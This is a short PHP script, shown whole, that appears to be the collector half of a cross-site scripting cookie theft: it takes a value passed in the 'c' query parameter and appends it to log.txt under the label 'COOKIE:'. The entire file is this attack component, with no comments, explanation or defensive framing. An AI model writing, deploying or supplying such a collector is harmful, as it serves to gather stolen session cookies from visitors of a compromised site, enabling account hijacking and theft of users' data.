<?php
	if (isset($_GET["c"]))
 	{
 		$cookies = $_GET["c"];
 		$file = fopen('log.txt', 'a');
		fwrite($file, "COOKIE: $cookies\n");	
 	}
 ?>